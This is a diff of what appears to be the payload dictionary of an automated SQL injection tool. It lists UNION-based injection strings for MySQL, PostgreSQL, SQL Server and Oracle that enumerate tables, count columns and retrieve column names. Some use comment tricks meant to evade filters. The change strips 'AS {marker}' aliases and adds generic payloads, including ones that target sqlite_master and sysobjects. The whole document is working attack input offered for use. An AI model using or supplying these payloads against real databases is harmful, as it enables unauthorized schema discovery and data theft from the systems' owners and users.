-            "' UNION SELECT table_name, null AS {marker} FROM `mydatabase`.information_schema.tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM pg_catalog.pg_tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM `mysql`.information_schema.tables -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_type='BASE TABLE' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%user%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'log%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'admin%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'session%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%mail%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'test%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%access%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'payment%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'orders%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'user%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%history%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%transaction%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE 'log%' AND table_schema='public' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE '%order%' -- ",
-            "' UNION SELECT table_name, null AS {marker} FROM information_schema.tables WHERE table_name LIKE '%invoice%' -- "
+            "' UNION SELECT table_name, null FROM information_schema.tables -- ",
+            "' UNION SELECT table_name, null FROM mysql.information_schema.tables -- ",
+            "' UNION SELECT table_name, null FROM sqlite_master -- ",
+            "' UNION SELECT name, null FROM sysobjects WHERE type='U' -- ",
+            "' UNION SELECT table_name, null FROM pg_tables -- ",
+            "' UNION SELECT table_name, null FROM INFORMATION_SCHEMA.tables WHERE table_schema = 'public' -- ",
+            "' UNION SELECT table_name, null FROM INFORMATION_SCHEMA.tables LIMIT 0, 10 -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema NOT LIKE 'mysql' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='information_schema' -- ",
+            "' UNION SELECT name, null FROM sqlite_master WHERE type='table' -- ",
+            "' UNION SELECT table_name, null FROM `mydatabase`.information_schema.tables -- ",
+            "' UNION SELECT table_name, null FROM pg_catalog.pg_tables -- ",
+            "' UNION SELECT table_name, null FROM `mysql`.information_schema.tables -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_type='BASE TABLE' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%user%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'log%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'admin%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'session%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%mail%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'test%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%access%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'payment%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'orders%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'user%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%history%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%transaction%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE 'log%' AND table_schema='public' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' AND table_name LIKE '%order%' -- ",
+            "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_name LIKE '%invoice%' -- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT TABLENAME::text AS {marker} FROM pg_tables WHERE SCHEMANAME='{db}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLENAME::text AS {marker} FROM pg_tables WHERE SCHEMANAME LIKE '{db}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLENAME::text AS {marker} FROM pg_tables WHERE SCHEMANAME IN ('{db}') OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLE_NAME::text AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLE_NAME::text AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '{db}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT TABLE_NAME::text AS {marker} FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN ('{db}') OFFSET 0 LIMIT 1-- "
+            "' UNION SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME='{db}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME LIKE '{db}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLENAME::text FROM pg_tables WHERE SCHEMANAME IN ('{db}') OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{db}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '{db}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT TABLE_NAME::text FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA IN ('{db}') OFFSET 0 LIMIT 1-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT TOP 1 name AS {marker} FROM {db}..sysobjects WHERE xtype='U'-- ",
-            "' UNION SELECT TOP 1 name AS {marker} FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects ORDER BY name) ORDER BY name-- ",
-            "' UNION SELECT TOP 1 name AS {marker} FROM {db}..sysobjects WHERE xtype='U'-- "
+            "' UNION SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U'-- ",
+            "' UNION SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects ORDER BY name) ORDER BY name-- "
         ],
         "Oracle": [
-            "' UNION SELECT TABLE_NAME AS {marker} FROM (SELECT TABLE_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='{db}') WHERE LIMIT=1-- "
+            "' UNION SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='{db}') WHERE LIMIT=1-- "
         ]
     },
     "cols_count": {
         "MySQL": [
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}'-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}')-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- "
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}'-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}')-- ",
+            "' UNION SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}'-- ",
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}')-- ",
-            "' UNION SELECT COUNT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
-            "' UNION SELECT COUNT(*) AS {marker} FROM pg_namespace, pg_type, pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname='{db}' AND a.relname='{tbl}'-- "
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}'-- ",
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}')-- ",
+            "' UNION SELECT COUNT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}'-- ",
+            "' UNION SELECT COUNT(*) FROM pg_namespace, pg_type, pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname='{db}' AND a.relname='{tbl}'-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT LTRIM(STR(COUNT(name))) AS {marker} FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name='{tbl}')-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(COLUMN_NAME))) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(*))) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
-            "' UNION SELECT LTRIM(STR(COUNT(*))) AS {marker} FROM {db}..sysobjects)-- -- -- "
+            "' UNION SELECT LTRIM(STR(COUNT(name))) FROM {db}..syscolumns WHERE id=(SELECT id FROM {db}..sysobjects WHERE name='{tbl}')-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(COLUMN_NAME))) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(*))) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_catalog='{db}' AND table_name='{tbl}'-- ",
+            "' UNION SELECT LTRIM(STR(COUNT(*))) FROM {db}..sysobjects)-- -- -- "
         ],
         "Oracle": [
-            "' UNION SELECT COUNT(TABLE_NAME) AS {marker} FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}'-- "
+            "' UNION SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}'-- "
         ]
     },
     "cols_names": {
         "MySQL": [
-            "' UNION SELECT COLUMN_NAME AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') LIMIT 0,1-- ",
-            "' UNION SELECT CONCAT_WS('(', '~', COLUMN_NAME) AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
-            "'/*!SELECT*/ CONCAT_WS('(', '~', /*!COLUMN_NAME*/) AS {marker} FROM /*!INFORMATION_SCHEMA*/./*!COLUMNS*/ WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT/**_**/0,1-- "
+            "' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT/**_**/(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') LIMIT 0,1-- ",
+            "' UNION SELECT CONCAT_WS('(', '~', COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT 0,1-- ",
+            "'/*!SELECT*/ CONCAT_WS('(', '~', /*!COLUMN_NAME*/) FROM /*!INFORMATION_SCHEMA*/./*!COLUMNS*/ WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' LIMIT/**_**/0,1-- "
         ],
         "PostgreSQL": [
-            "' UNION SELECT COLUMN_NAME::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT COLUMN_NAME::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT COLUMN_NAME::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT CONCAT(COLUMN_NAME)::text AS {marker} FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') OFFSET 0 LIMIT 1-- ",
-            "' UNION SELECT attname AS {marker} FROM pg_namespace, pg_type, pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname='{db}' AND a.relname='{tbl}' OFFSET 0 LIMIT 1-- "
+            "' UNION SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE '{db}' AND TABLE_NAME LIKE '{tbl}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{tbl}' OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT COLUMN_NAME::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT CONCAT(COLUMN_NAME)::text FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA IN ('{db}') AND TABLE_NAME IN ('{tbl}') OFFSET 0 LIMIT 1-- ",
+            "' UNION SELECT attname FROM pg_namespace, pg_type, pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND nspname='{db}' AND a.relname='{tbl}' OFFSET 0 LIMIT 1-- "
         ],
         "Microsoft SQL Server": [
-            "' UNION SELECT TOP 1 name AS {marker} FROM {db}..sysobjects WHERE xtype='U'-- ",
-            "' UNION SELECT TOP 1 name AS {marker} FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects ORDER BY name) ORDER BY name-- "
+            "' UNION SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U'-- ",
+            "' UNION SELECT TOP 1 name FROM {db}..sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 0 name FROM {db}..sysobjects ORDER BY name) ORDER BY name-- "
         ],
         "Oracle": [
-            "' UNION SELECT COLUMN_NAME AS {marker} FROM (SELECT COLUMN_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}') WHERE LIMIT=1-- "
+            "' UNION SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='{db}' AND TABLE_NAME='{tbl}') WHERE LIMIT=1-- "
         ]
     }
 }
